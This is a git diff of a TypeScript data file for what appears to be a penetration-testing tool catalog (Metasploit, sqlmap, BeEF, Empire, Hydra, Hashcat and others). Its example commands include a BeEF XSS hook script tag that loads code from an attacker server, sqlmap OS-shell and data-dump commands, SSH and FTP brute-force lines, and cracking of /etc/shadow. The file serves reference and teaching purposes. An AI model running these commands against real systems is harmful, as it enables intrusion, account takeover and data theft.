-        "Found exploit: exploit/windows/smb/ms17_010_eternalblue",
-        "Target set: 192.168.1.100",
-        "Meterpreter session opened successfully"
+        "Found 23 matching exploits",
+        "EternalBlue exploit loaded",
+        "Target host configured: 192.168.1.100"
       ],
       useCases: [
-        "Vulnerability exploitation",
         "Penetration testing",
-        "Security research",
-        "Payload development"
+        "Vulnerability validation",
+        "Exploit development",
+        "Security research"
       ],
       features: [
         "Extensive exploit database",
         "Payload generation",
         "Post-exploitation modules",
-        "Session management",
-        "Automated exploitation"
+        "Vulnerability scanning",
+        "Report generation"
       ],
       installSteps: [
-        "Install on Kali: Already pre-installed",
-        "Ubuntu: sudo apt install metasploit-framework",
+        "Download installer from official site",
+        "Install: sudo ./metasploit-latest-linux-x64-installer.run",
         "Initialize database: msfdb init",
-        "Start framework: msfconsole"
+        "Start console: msfconsole"
       ],
       basicUsage: [
         "Start console: msfconsole",
-        "Search exploits: search [vulnerability]",
+        "Search exploits: search [term]",
         "Use exploit: use [exploit_path]",
         "Set options and run: exploit"
       ]
@@ -923,730 +975,48 @@ export const toolsData: Record<string, Tool[]> = {
       longDescription: "sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.",
       category: "Exploitation",
       difficulty: "Intermediate",
-      lastUpdated: "2024-01-18",
+      lastUpdated: "2024-01-15",
       officialSite: "http://sqlmap.org",
       icon: "💉",
-      whatItIs: "An automated tool for detecting and exploiting SQL injection vulnerabilities in web applications.",
-      whatItsUsedFor: "Used by penetration testers and security researchers to identify and exploit SQL injection vulnerabilities in web applications and databases.",
-      howItWorks: "Automatically detects SQL injection points, fingerprints databases, extracts data, and can even provide shell access through SQL injection vulnerabilities.",
+      whatItIs: "An automated tool for detecting and exploiting SQL injection vulnerabilities.",
+      whatItsUsedFor: "Used by penetration testers and security researchers to identify SQL injection vulnerabilities in web applications and demonstrate their impact.",
+      howItWorks: "Automatically tests web application parameters for SQL injection vulnerabilities using various techniques and payloads, then exploits found vulnerabilities to extract data.",
       commands: [
-        "sqlmap -u 'http://example.com/page.php?id=1'",
-        "sqlmap -u 'http://example.com/page.php?id=1' --dbs",
-        "sqlmap -u 'http://example.com/page.php?id=1' -D database --tables",
-        "sqlmap -u 'http://example.com/page.php?id=1' --os-shell"
+        "sqlmap -u 'http://target.com/page.php?id=1'",
+        "sqlmap -u 'http://target.com/page.php?id=1' --dbs",
+        "sqlmap -u 'http://target.com/page.php?id=1' -D database --tables",
+        "sqlmap -u 'http://target.com/page.php?id=1' -D database -T users --dump"
       ],
       results: [
         "SQL injection vulnerability detected",
-        "Database: MySQL 5.7.29",
-        "Available databases: [3] information_schema, test, users",
-        "OS shell obtained: www-data@webserver"
+        "Available databases: webapp, mysql, information_schema",
+        "Tables found: users, products, orders",
+        "User data extracted: 150 records dumped"
       ],
       useCases: [
         "SQL injection testing",
-        "Database security assessment",
-        "Web application penetration testing",
-        "Database enumeration"
+        "Database enumeration",
+        "Data extraction",
+        "Security assessments"
       ],
       features: [
         "Automatic injection detection",
-        "Database fingerprinting",
-        "Data extraction",
+        "Multiple DBMS support",
+        "Data extraction capabilities",
         "File system access",
-        "OS command execution"
+        "Operating system takeover"
       ],
       installSteps: [
-        "Install Python: sudo apt install python3",
         "Clone repository: git clone https://github.com/sqlmapproject/sqlmap.git",
         "Navigate to directory: cd sqlmap",
-        "Run: python sqlmap.py"
+        "Install Python dependencies: pip install -r requirements.txt",
+        "Test: python sqlmap.py --version"
       ],
       basicUsage: [
         "Basic test: sqlmap -u '[URL]'",
-        "Enumerate databases: sqlmap -u '[URL]' --dbs",
-        "Extract tables: sqlmap -u '[URL]' -D [db] --tables",
+        "List databases: sqlmap -u '[URL]' --dbs",
+        "List tables: sqlmap -u '[URL]' -D [db] --tables",
         "Dump data: sqlmap -u '[URL]' -D [db] -T [table] --dump"
-      ]
-    },
-    {
-      id: "burp-suite",
-      name: "Burp Suite",
-      fullName: "Burp Suite Professional",
-      description: "Web application security testing platform with comprehensive testing tools",
-      longDescription: "Burp Suite is an integrated platform for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process.",
-      category: "Exploitation",
-      difficulty: "Intermediate",
-      lastUpdated: "2024-01-21",
-      officialSite: "https://portswigger.net/burp",
-      icon: "🔥",
-      whatItIs: "A comprehensive web application security testing platform with proxy, scanner, and exploitation tools.",
-      whatItsUsedFor: "Used by security professionals to test web applications for vulnerabilities, manipulate web traffic, and exploit security flaws.",
-      howItWorks: "Acts as a proxy between the browser and web application, allowing interception, modification, and analysis of HTTP/HTTPS traffic for security testing.",
-      commands: [
-        "Start Burp Suite application",
-        "Configure browser proxy settings",
-        "Intercept and modify requests",
-        "Run automated scans"
-      ],
-      results: [
-        "Burp Suite Professional started",
-        "Proxy listening on 127.0.0.1:8080",
-        "15 vulnerabilities found in scan",
-        "SQL injection detected in login form"
-      ],
-      useCases: [
-        "Web application penetration testing",
-        "API security testing",
-        "Manual security testing",
-        "Vulnerability scanning"
-      ],
-      features: [
-        "HTTP/HTTPS proxy",
-        "Automated vulnerability scanning",
-        "Manual testing tools",
-        "Extensibility through plugins",
-        "Collaboration features"
-      ],
-      installSteps: [
-        "Download from official website",
-        "Install Java Runtime Environment",
-        "Run installer package",
-        "Configure license (Pro version)"
-      ],
-      basicUsage: [
-        "Start Burp Suite",
-        "Configure browser proxy: 127.0.0.1:8080",
-        "Browse target application",
-        "Analyze intercepted traffic"
-      ]
-    },
-    {
-      id: "beef-xss",
-      name: "BeEF XSS",
-      fullName: "Browser Exploitation Framework - XSS",
-      description: "Specialized XSS exploitation and browser hooking framework",
-      longDescription: "BeEF XSS is a specialized version focusing on Cross-Site Scripting exploitation and advanced browser-based attacks through JavaScript injection.",
-      category: "Exploitation",
-      difficulty: "Advanced",
-      lastUpdated: "2024-01-16",
-      officialSite: "https://beefproject.com",
-      icon: "🪝",
-      whatItIs: "A specialized framework for exploiting XSS vulnerabilities and conducting browser-based attacks.",
-      whatItsUsedFor: "Used to demonstrate the impact of XSS vulnerabilities and conduct advanced client-side exploitation through browser hooking.",
-      howItWorks: "Exploits XSS vulnerabilities to inject JavaScript hooks that establish persistent connections with victim browsers for payload execution.",
-      commands: [
-        "./beef",
-        "Insert XSS payload: <script src='http://beef-server:3000/hook.js'></script>",
-        "Access hooked browser in control panel",
-        "Execute XSS exploitation modules"
-      ],
-      results: [
-        "XSS hook successfully injected",
-        "Browser hooked: Firefox on Linux",
-        "Credential harvesting module deployed",
-        "Session cookies captured"
-      ],
-      useCases: [
-        "XSS vulnerability exploitation",
-        "Client-side penetration testing",
-        "Browser security assessment",
-        "Post-exploitation activities"
-      ],
-      features: [
-        "XSS payload generation",
-        "Browser hooking",
-        "Real-time browser control",
-        "Credential harvesting",
-        "Network reconnaissance"
-      ],
-      installSteps: [
-        "Install Ruby and dependencies: sudo apt install ruby-dev",
-        "Clone BeEF repository",
-        "Install gems: bundle install",
-        "Configure for XSS mode"
-      ],
-      basicUsage: [
-        "Start BeEF server",
-        "Inject XSS hook into vulnerable page",
-        "Monitor hooked browsers",
-        "Execute exploitation modules"
-      ]
-    },
-    {
-      id: "empire",
-      name: "Empire",
-      fullName: "PowerShell Empire",
-      description: "Post-exploitation framework for Windows environments using PowerShell",
-      longDescription: "Empire is a PowerShell and Python post-exploitation agent built on cryptologically-secure communications and a flexible architecture.",
-      category: "Exploitation",
-      difficulty: "Advanced",
-      lastUpdated: "2024-01-17",
-      officialSite: "https://github.com/EmpireProject/Empire",
-      icon: "👑",
-      whatItIs: "A post-exploitation framework specifically designed for Windows environments using PowerShell agents.",
-      whatItsUsedFor: "Used in red team operations and penetration testing for maintaining persistence, privilege escalation, and lateral movement in Windows networks.",
-      howItWorks: "Uses PowerShell agents that communicate over encrypted channels to provide persistent access and execute various post-exploitation modules.",
-      commands: [
-        "./empire",
-        "listeners",
-        "uselistener http",
-        "execute"
-      ],
-      results: [
-        "Empire framework started",
-        "HTTP listener established on port 80",
-        "Agent checked in: DESKTOP-ABC123",
-        "Privilege escalation successful"
-      ],
-      useCases: [
-        "Post-exploitation activities",
-        "Persistent access maintenance",
-        "Lateral movement",
-        "Windows environment assessment"
-      ],
-      features: [
-        "PowerShell agents",
-        "Encrypted communications",
-        "Modular architecture",
-        "Persistence mechanisms",
-        "Privilege escalation"
-      ],
-      installSteps: [
-        "Clone repository: git clone https://github.com/EmpireProject/Empire",
-        "Install dependencies: sudo apt install python3-dev",
-        "Run setup: sudo ./setup/install.sh",
-        "Start Empire: ./empire"
-      ],
-      basicUsage: [
-        "Start Empire: ./empire",
-        "Create listener: uselistener http",
-        "Generate payload: usestager windows/launcher_bat",
-        "Execute on target and wait for agent"
-      ]
-    },
-    {
-      id: "cobalt-strike",
-      name: "Cobalt Strike",
-      fullName: "Cobalt Strike Adversary Simulation",
-      description: "Commercial adversary simulation and red team operations platform",
-      longDescription: "Cobalt Strike is a commercial penetration testing tool that is designed to execute targeted attacks and emulate advanced persistent threats.",
-      category: "Exploitation",
-      difficulty: "Advanced",
-      lastUpdated: "2024-01-19",
-      officialSite: "https://www.cobaltstrike.com",
-      icon: "⚡",
-      whatItIs: "A commercial red team and adversary simulation platform for advanced penetration testing.",
-      whatItsUsedFor: "Used by red teams and advanced penetration testers to simulate sophisticated attacks and test enterprise security controls.",
-      howItWorks: "Provides a collaborative platform with beacon agents, malleable communication profiles, and advanced post-exploitation capabilities.",
-      commands: [
-        "Start team server",
-        "Connect Cobalt Strike client",
-        "Generate beacon payloads",
-        "Execute lateral movement"
-      ],
-      results: [
-        "Team server started successfully",
-        "Beacon session established",
-        "Lateral movement to DC completed",
-        "Domain admin privileges obtained"
-      ],
-      useCases: [
-        "Red team operations",
-        "Advanced persistent threat simulation",
-        "Enterprise security testing",
-        "Collaborative penetration testing"
-      ],
-      features: [
-        "Beacon agents",
-        "Malleable C2 profiles",
-        "Collaborative interface",
-        "Advanced evasion techniques",
-        "Comprehensive reporting"
-      ],
-      installSteps: [
-        "Purchase license from official website",
-        "Download client and server components",
-        "Install Java Runtime Environment",
-        "Configure team server"
-      ],
-      basicUsage: [
-        "Start team server with password",
-        "Connect client to team server",
-        "Generate and deploy beacons",
-        "Execute attack techniques"
-      ]
-    }
-  ],
-
-  "password-cracking": [
-    {
-      id: "hashcat",
-      name: "Hashcat",
-      fullName: "Advanced Password Recovery",
-      description: "World's fastest and most advanced password recovery utility",
-      longDescription: "Hashcat is the world's fastest and most advanced password recovery utility, supporting five unique modes of attack for over 300 highly-optimized hashing algorithms.",
-      category: "Password Cracking",
-      difficulty: "Intermediate",
-      lastUpdated: "2024-01-22",
-      officialSite: "https://hashcat.net/hashcat",
-      icon: "🔓",
-      whatItIs: "A high-performance password cracking tool that uses GPU acceleration for extremely fast hash cracking.",
-      whatItsUsedFor: "Used by security professionals to test password strength, recover lost passwords, and assess the security of password storage mechanisms.",
-      howItWorks: "Uses various attack modes including dictionary, brute-force, and rule-based attacks with GPU acceleration to crack password hashes at high speeds.",
-      commands: [
-        "hashcat -m 0 -a 0 hashes.txt wordlist.txt",
-        "hashcat -m 1000 -a 3 ntlm.txt ?a?a?a?a?a?a",
-        "hashcat -m 22000 capture.hc22000 wordlist.txt",
-        "hashcat --show hashes.txt"
-      ],
-      results: [
-        "Session started successfully",
-        "Cracked 15/20 hashes (75%)",
-        "Password found: admin123",
-        "Cracking speed: 1.2 GH/s"
-      ],
-      useCases: [
-        "Password strength testing",
-        "Digital forensics investigations",
-        "Penetration testing",
-        "Security compliance testing"
-      ],
-      features: [
-        "GPU acceleration support",
-        "300+ hash algorithm support",
-        "Multiple attack modes",
-        "Rule-based attacks",
-        "Session management"
-      ],
-      installSteps: [
-        "Download from official website",
-        "Extract archive: unzip hashcat-6.x.x.zip",
-        "Install GPU drivers (NVIDIA/AMD)",
-        "Test: ./hashcat.exe --benchmark"
-      ],
-      basicUsage: [
-        "Dictionary attack: hashcat -m [hash_type] -a 0 [hashes] [wordlist]",
-        "Brute force: hashcat -m [hash_type] -a 3 [hashes] [mask]",
-        "Show cracked: hashcat --show [hashes]",
-        "Benchmark: hashcat --benchmark"
-      ]
-    },
-    {
-      id: "john-the-ripper",
-      name: "John the Ripper",
-      fullName: "John the Ripper Password Cracker",
-      description: "Fast password cracker with support for many hash types",
-      longDescription: "John the Ripper is a free password cracking software tool initially developed for the Unix operating system. It can run on fifteen different platforms including Unix, DOS, Win32, BeOS, and OpenVMS.",
-      category: "Password Cracking",
-      difficulty: "Beginner",
-      lastUpdated: "2024-01-20",
-      officialSite: "https://www.openwall.com/john",
-      icon: "🔨",
-      whatItIs: "A versatile password cracker that can detect hash types and perform dictionary and brute-force attacks.",
-      whatItsUsedFor: "Used for password auditing, security testing, and recovering passwords from various hash formats found in system files.",
-      howItWorks: "Automatically detects hash types and applies appropriate cracking methods including dictionary attacks, rule-based attacks, and brute force.",
-      commands: [
-        "john --wordlist=wordlist.txt hashes.txt",
-        "john --incremental hashes.txt",
-        "john --show hashes.txt",
-        "john --format=raw-md5 md5hashes.txt"
-      ],
-      results: [
-        "Loaded 10 password hashes",
-        "Using default input encoding: UTF-8",
-        "password123 (user1)",
-        "admin (administrator)"
-      ],
-      useCases: [
-        "Password auditing",
-        "System security testing",
-        "Digital forensics",
-        "Compliance verification"
-      ],
-      features: [
-        "Automatic hash detection",
-        "Multiple attack modes",
-        "Custom rule creation",
-        "Multi-platform support",
-        "Distributed cracking"
-      ],
-      installSteps: [
-        "Install: sudo apt install john",
-        "Verify installation: john --test",
-        "Download wordlists: sudo apt install wordlists",
-        "Test with sample: john /etc/shadow"
-      ],
-      basicUsage: [
-        "Dictionary attack: john --wordlist=[wordlist] [hashes]",
-        "Brute force: john --incremental [hashes]",
-        "Show results: john --show [hashes]",
-        "Specific format: john --format=[type] [hashes]"
-      ]
-    },
-    {
-      id: "hydra",
-      name: "Hydra",
-      fullName: "THC Hydra Login Cracker",
-      description: "Parallelized login cracker supporting numerous protocols",
-      longDescription: "Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add.",
-      category: "Password Cracking",
-      difficulty: "Intermediate",
-      lastUpdated: "2024-01-18",
-      officialSite: "https://github.com/vanhauser-thc/thc-hydra",
-      icon: "🐍",
-      whatItIs: "A network login cracker that performs brute-force attacks against various network services.",
-      whatItsUsedFor: "Used to test the security of network services by attempting to crack login credentials through brute-force and dictionary attacks.",
-      howItWorks: "Performs parallelized brute-force attacks against network services like SSH, FTP, HTTP, and many others using wordlists and credential combinations.",
-      commands: [
-        "hydra -l admin -P passwords.txt ssh://192.168.1.1",
-        "hydra -L users.txt -P passwords.txt ftp://192.168.1.1",
-        "hydra -l admin -p admin http-get://192.168.1.1/admin",
-        "hydra -C credentials.txt ssh://192.168.1.1"
-      ],
-      results: [
-        "Starting Hydra v9.4",
-        "[SSH] host: 192.168.1.1 login: admin password: password123",
-        "1 of 1 target successfully completed",
-        "Attack completed in 2.5 minutes"
-      ],
-      useCases: [
-        "Network service security testing",
-        "Credential brute-forcing",
-        "Authentication bypass testing",
-        "Security compliance verification"
-      ],
-      features: [
-        "Support for 50+ protocols",
-        "Parallelized attacks",
-        "Custom wordlist support",
-        "Session resume capability",
-        "Module extensibility"
-      ],
-      installSteps: [
-        "Install: sudo apt install hydra",
-        "Verify: hydra -h",
-        "Download wordlists: wget SecLists",
-        "Test connection: hydra -L users.txt -P pass.txt [target] [service]"
-      ],
-      basicUsage: [
-        "Single user: hydra -l [user] -P [passlist] [target] [service]",
-        "User list: hydra -L [userlist] -P [passlist] [target] [service]",
-        "Combo list: hydra -C [combo.txt] [target] [service]",
-        "HTTP form: hydra -L users.txt -P pass.txt [target] http-post-form"
-      ]
-    },
-    {
-      id: "medusa",
-      name: "Medusa",
-      fullName: "Medusa Parallel Login Brute-Forcer",
-      description: "Speedy, parallel, and modular login brute-forcer",
-      longDescription: "Medusa is intended to be a speedy, massively parallel, modular, login brute-forcer. The goal is to support as many services which allow remote authentication as possible.",
-      category: "Password Cracking",
-      difficulty: "Intermediate",
-      lastUpdated: "2024-01-16",
-      officialSite: "http://foofus.net/goons/jmk/medusa/medusa.html",
-      icon: "🏛️",
-      whatItIs: "A parallel network login brute-forcer with modular architecture for testing various authentication services.",
-      whatItsUsedFor: "Used for testing password strength of network services and identifying weak authentication mechanisms in penetration testing.",
-      howItWorks: "Uses a modular approach to perform parallel brute-force attacks against network authentication services with customizable threading and timing options.",
-      commands: [
-        "medusa -h 192.168.1.1 -u admin -P passwords.txt -M ssh",
-        "medusa -H hosts.txt -U users.txt -P passwords.txt -M ftp",
-        "medusa -h 192.168.1.1 -U users.txt -p password -M telnet",
-        "medusa -C combo.txt -h 192.168.1.1 -M http"
-      ],
-      results: [
-        "Medusa v2.2 [http://www.foofus.net]",
-        "ACCOUNT FOUND: [ssh] Host: 192.168.1.1 User: admin Password: admin123",
-        "Success rate: 1/100 (1%)",
-        "Timing: Real: 45.2s User: 2.1s System: 1.8s"
-      ],
-      useCases: [
-        "Network authentication testing",
-        "Password policy verification",
-        "Service security assessment",
-        "Parallel credential testing"
-      ],
-      features: [
-        "Parallel processing",
-        "Modular service support",
-        "Flexible authentication options",
-        "Resume capability",
-        "Multiple output formats"
-      ],
-      installSteps: [
-        "Install: sudo apt install medusa",
-        "Check modules: medusa -d",
-        "Verify installation: medusa -h",
-        "Test with service: medusa -h [target] -M [module]"
-      ],
-      basicUsage: [
-        "Basic attack: medusa -h [host] -u [user] -P [passlist] -M [module]",
-        "Multiple hosts: medusa -H [hostlist] -u [user] -P [passlist] -M [module]",
-        "Combo attack: medusa -C [combo.txt] -h [host] -M [module]",
-        "Threaded: medusa -h [host] -u [user] -P [passlist] -M [module] -t 20"
-      ]
-    },
-    {
-      id: "ophcrack",
-      name: "Ophcrack",
-      fullName: "Windows Password Cracker",
-      description: "Windows password cracker based on rainbow tables",
-      longDescription: "Ophcrack is a free Windows password cracker based on rainbow tables. It is efficient implementation of rainbow tables done by the inventors of the method.",
-      category: "Password Cracking",
-      difficulty: "Beginner",
-      lastUpdated: "2024-01-14",
-      officialSite: "http://ophcrack.sourceforge.net",
-      icon: "🌈",
-      whatItIs: "A Windows password cracker that uses precomputed rainbow tables for extremely fast password recovery.",
-      whatItsUsedFor: "Used for recovering Windows user passwords, particularly useful in digital forensics and password recovery scenarios.",
-      howItWorks: "Uses precomputed rainbow tables to perform time-memory trade-off attacks, making password cracking much faster than traditional brute-force methods.",
-      commands: [
-        "Launch Ophcrack GUI",
-        "Load SAM database",
-        "Install rainbow tables",
-        "Start cracking process"
-      ],
-      results: [
-        "SAM database loaded successfully",
-        "Rainbow tables installed: Vista/7 special",
-        "Password found: user1 -> password123",
-        "Cracking completed in 2 minutes"
-      ],
-      useCases: [
-        "Windows password recovery",
-        "Digital forensics investigations",
-        "System administrator password reset",
-        "Security awareness demonstrations"
-      ],
-      features: [
-        "Rainbow table support",
-        "Graphical user interface",
-        "Live CD available",
-        "Multiple hash types",
-        "Automatic SAM extraction"
-      ],
-      installSteps: [
-        "Download from official website",
-        "Install application package",
-        "Download rainbow tables",
-        "Extract SAM file from Windows system"
-      ],
-      basicUsage: [
-        "Launch Ophcrack application",
-        "Load -> Single hash or SAM file",
-        "Install appropriate rainbow tables",
-        "Click 'Crack' to start process"
-      ]
-    },
-    {
-      id: "crunch",
-      name: "Crunch",
-      fullName: "Wordlist Generator",
-      description: "Wordlist generator for creating custom password lists",
-      longDescription: "Crunch is a wordlist generator where you can specify a standard character set or a character set you specify. Crunch can generate all possible combinations and permutations.",
-      category: "Password Cracking",
-      difficulty: "Beginner",
-      lastUpdated: "2024-01-12",
-      officialSite: "https://sourceforge.net/projects/crunch-wordlist",
-      icon: "📝",
-      whatItIs: "A highly configurable wordlist generator for creating custom password dictionaries.",
-      whatItsUsedFor: "Used to generate targeted wordlists for password cracking based on known information about the target or password policies.",
-      howItWorks: "Generates wordlists based on specified character sets, lengths, and patterns, allowing for highly targeted password dictionary creation.",
-      commands: [
-        "crunch 8 8 0123456789 -o numbers.txt",
-        "crunch 6 10 abcdefghijklmnopqrstuvwxyz",
-        "crunch 4 6 -f charset.lst mixalpha-numeric",
-        "crunch 8 8 -t @@@@2024"
-      ],
-      results: [
-        "Generating wordlist...",
-        "Wordlist created: numbers.txt",
-        "Generated 100,000,000 passwords",
-        "File size: 900MB"
-      ],
-      useCases: [
-        "Custom wordlist generation",
-        "Targeted password attacks",
-        "Policy-based dictionary creation",
-        "Penetration testing preparation"
-      ],
-      features: [
-        "Custom character sets",
-        "Pattern-based generation",
-        "Large file support",
-        "Resume capability",
-        "Multiple output formats"
-      ],
-      installSteps: [
-        "Install: sudo apt install crunch",
-        "Verify: crunch --help",
-        "Check character sets: ls /usr/share/crunch/charset.lst",
-        "Test generation: crunch 4 4 abcd"
-      ],
-      basicUsage: [
-        "Basic: crunch [min] [max] [charset]",
-        "Pattern: crunch [min] [max] -t [pattern]",
-        "Output file: crunch [min] [max] [charset] -o [file]",
-        "Character file: crunch [min] [max] -f [charset_file] [name]"
-      ]
-    }
-  ],
-
-  "vulnerability-scanning": [
-    {
-      id: "nessus",
-      name: "Nessus",
-      fullName: "Nessus Vulnerability Scanner",
-      description: "Comprehensive vulnerability scanner for identifying security flaws",
-      longDescription: "Nessus is a remote security scanning tool, which scans a computer and raises an alert if it discovers any vulnerabilities that malicious hackers could use to gain access.",
-      category: "Vulnerability Scanning",
-      difficulty: "Beginner",
-      lastUpdated: "2024-01-23",
-      officialSite: "https://www.tenable.com/products/nessus",
-      icon: "🔍",
-      whatItIs: "A comprehensive vulnerability scanner that identifies security flaws in networks, systems, and applications.",
-      whatItsUsedFor: "Used by security professionals to conduct vulnerability assessments, compliance checking, and security auditing of IT infrastructure.",
-      howItWorks: "Performs remote and local security checks using an extensive database of vulnerability tests and plugins to identify potential security issues.",
-      commands: [
-        "Access web interface: https://localhost:8834",
-        "Create new scan policy",
-        "Configure scan targets",
-        "Launch vulnerability scan"
-      ],
-      results: [
-        "Nessus scan completed successfully",
-        "Found 25 vulnerabilities (5 Critical, 8 High, 12 Medium)",
-        "Generated comprehensive report",
-        "Identified missing security patches"
-      ],
-      useCases: [
-        "Vulnerability assessment",
-        "Compliance scanning",
-        "Security auditing",
-        "Patch management"
-      ],
-      features: [
-        "Comprehensive vulnerability database",
-        "Web-based interface",
-        "Compliance templates",
-        "Custom policy creation",
-        "Detailed reporting"
-      ],
-      installSteps: [
-        "Download from Tenable website",
-        "Install package: sudo dpkg -i Nessus.deb",
-        "Start service: sudo systemctl start nessusd",
-        "Access web UI: https://localhost:8834"
-      ],
-      basicUsage: [
-        "Access web interface",
-        "Create scan policy",
-        "Add target hosts/networks",
-        "Launch scan and review results"
-      ]
-    },
-    {
-      id: "openvas",
-      name: "OpenVAS",
-      fullName: "Open Vulnerability Assessment Scanner",
-      description: "Open-source vulnerability scanner and management solution",
-      longDescription: "OpenVAS is a full-featured vulnerability scanner. Its capabilities include unauthenticated testing, authenticated testing, various high level and low level Internet and industrial protocols.",
-      category: "Vulnerability Scanning",
-      difficulty: "Intermediate",
-      lastUpdated: "2024-01-21",
-      officialSite: "https://www.openvas.org",
-      icon: "🛡️",
-      whatItIs: "An open-source vulnerability assessment platform providing comprehensive security scanning capabilities.",
-      whatItsUsedFor: "Used for identifying vulnerabilities in networks and systems, providing detailed security assessments for organizations.",
-      howItWorks: "Uses a client-server architecture with a comprehensive vulnerability database to perform authenticated and unauthenticated security tests.",
-      commands: [
-        "gvm-setup",
-        "gvm-start",
-        "gvm-feed-update",
-        "Access web interface: https://localhost:9392"
-      ],
-      results: [
-        "OpenVAS setup completed",
-        "Vulnerability feeds updated",
-        "Scan completed: 45 vulnerabilities found",
-        "Report generated with remediation steps"
-      ],
-      useCases: [
-        "Network vulnerability assessment",
-        "Continuous security monitoring",
-        "Compliance reporting",
-        "Risk management"
-      ],
-      features: [
-        "Comprehensive scan engine",
-        "Web-based management interface",
-        "Vulnerability feed updates",
-        "Custom report generation",
-        "API integration"
-      ],
-      installSteps: [
-        "Install dependencies: sudo apt install postgresql",
-        "Install OpenVAS: sudo apt install openvas",
-        "Setup: sudo gvm-setup",
-        "Start services: sudo gvm-start"
-      ],
-      basicUsage: [
-        "Setup OpenVAS: gvm-setup",
-        "Start services: gvm-start",
-        "Access web UI: https://localhost:9392",
-        "Create and run scans"
-      ]
-    },
-    {
-      id: "nikto",
-      name: "Nikto",
-      fullName: "Nikto Web Server Scanner",
-      description: "Web server scanner for identifying potential vulnerabilities",
-      longDescription: "Nikto is an Open Source web server scanner which performs comprehensive tests against web servers for multiple items including dangerous files/programs.",
-      category: "Vulnerability Scanning",
-      difficulty: "Beginner",
-      lastUpdated: "2024-01-19",
-      officialSite: "https://cirt.net/Nikto2",
-      icon: "🌐",
-      whatItIs: "A web server scanner that tests for thousands of potentially dangerous files, programs, and server configurations.",
-      whatItsUsedFor: "Used to identify security issues in web servers, including outdated software, dangerous files, and configuration problems.",
-      howItWorks: "Performs comprehensive tests against web servers by checking for known vulnerabilities, misconfigurations, and dangerous files.",
-      commands: [
-        "nikto -h http://example.com",
-        "nikto -h 192.168.1.1 -p 80,443",
-        "nikto -h http://example.com -o report.html",
-        "nikto -h http://example.com -evasion 1"
-      ],
-      results: [
-        "Nikto v2.1.6 scan initiated",
-        "Target: http://example.com:80",
-        "Found 15 potential vulnerabilities",
-        "Scan completed in 2 minutes"
-      ],
-      useCases: [
-        "Web server security assessment",
-        "Configuration review",
-        "Vulnerability identification",
-        "Compliance checking"
-      ],
-      features: [
-        "Comprehensive vulnerability database",
-        "Multiple output formats",
-        "SSL support",
-        "Proxy support",
-        "Evasion techniques"
-      ],
-      installSteps: [
-        "Install: sudo apt install nikto",
-        "Update database: nikto -update",
-        "Verify installation: nikto -h",
-        "Test scan: nikto -h http://example.com"
-      ],
-      basicUsage: [
-        "Basic scan: nikto -h [target]",
-        "Multiple ports: nikto -h [target] -p [ports]",
-        "Output file: nikto -h [target] -o [file]",
-        "SSL scan: nikto -h https://[target]"
       ]
     },
     {
@@ -1654,513 +1024,91 @@ export const toolsData: Record<string, Tool[]> = {
       name: "Nuclei",
       fullName: "Nuclei Vulnerability Scanner",
       description: "Fast vulnerability scanner with template-based scanning",
-      longDescription: "Nuclei is used to send requests across targets based on a template leading to zero false positives and providing fast scanning on large number of hosts.",
-      category: "Vulnerability Scanning",
+      longDescription: "Nuclei is a fast vulnerability scanner with template-based scanning that enables security researchers to create custom vulnerability detection templates with ease.",
+      category: "Exploitation",
       difficulty: "Intermediate",
-      lastUpdated: "2024-01-24",
+      lastUpdated: "2024-01-20",
       officialSite: "https://nuclei.projectdiscovery.io",
       icon: "⚛️",
-      whatItIs: "A modern vulnerability scanner that uses YAML-based templates for fast and accurate security testing.",
-      whatItsUsedFor: "Used for automated vulnerability discovery across large-scale infrastructure with minimal false positives.",
-      howItWorks: "Uses community-driven templates written in YAML to perform targeted vulnerability scans with high accuracy and speed.",
+      whatItIs: "A fast, template-based vulnerability scanner designed for large-scale scanning.",
+      whatItsUsedFor: "Used by security teams for continuous security monitoring, bug bounty hunting, and automated vulnerability detection across large infrastructures.",
+      howItWorks: "Uses YAML-based templates to define vulnerability checks, allowing for rapid scanning of web applications, networks, and cloud services.",
       commands: [
         "nuclei -u https://example.com",
-        "nuclei -l targets.txt -t cves/",
-        "nuclei -u https://example.com -severity critical,high",
-        "nuclei -u https://example.com -o results.txt"
+        "nuclei -l targets.txt",
+        "nuclei -u https://example.com -t cves/",
+        "nuclei -u https://example.com -severity critical,high"
       ],
       results: [
-        "Nuclei v2.8.0 scan started",
-        "Templates loaded: 4,567",
-        "Found vulnerability: CVE-2021-44228 (Log4j)",
-        "Scan completed: 5 vulnerabilities found"
+        "Loaded 3,847 templates",
+        "Found Apache version disclosure",
+        "Detected SQL injection in /login.php",
+        "Critical XSS vulnerability identified"
       ],
       useCases: [
         "Continuous security monitoring",
-        "Large-scale vulnerability scanning",
         "Bug bounty hunting",
-        "CI/CD security integration"
+        "Infrastructure scanning",
+        "Compliance checking"
       ],
       features: [
         "Template-based scanning",
-        "Community-driven templates",
-        "Fast parallel execution",
-        "Zero false positives",
-        "Custom template creation"
+        "High-speed execution",
+        "Community templates",
+        "Custom template creation",
+        "Multiple output formats"
       ],
       installSteps: [
-        "Download binary from GitHub releases",
-        "Install: wget -O nuclei https://github.com/projectdiscovery/nuclei/releases/download/v2.8.0/nuclei_2.8.0_linux_amd64.tar.gz",
-        "Extract and install: tar -xzf nuclei*.tar.gz && sudo mv nuclei /usr/local/bin/",
-        "Update templates: nuclei -update-templates"
+        "Download from GitHub releases",
+        "Or install with Go: go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest",
+        "Update templates: nuclei -update-templates",
+        "Test: nuclei -version"
       ],
       basicUsage: [
-        "Single target: nuclei -u [URL]",
-        "Multiple targets: nuclei -l [file]",
+        "Basic scan: nuclei -u [URL]",
+        "Multiple targets: nuclei -l targets.txt",
         "Specific templates: nuclei -u [URL] -t [template]",
-        "Severity filter: nuclei -u [URL] -severity [level]"
+        "Filter severity: nuclei -u [URL] -severity high"
       ]
     },
     {
-      id: "wpscan",
-      name: "WPScan",
-      fullName: "WordPress Security Scanner",
-      description: "Black box WordPress vulnerability scanner",
-      longDescription: "WPScan is a free, for non-commercial use, black box WordPress vulnerability scanner written for security professionals and blog maintainers to test the security of their WordPress websites.",
-      category: "Vulnerability Scanning",
-      difficulty: "Beginner",
-      lastUpdated: "2024-01-17",
-      officialSite: "https://wpscan.com",
-      icon: "📝",
-      whatItIs: "A specialized vulnerability scanner designed specifically for WordPress websites and applications.",
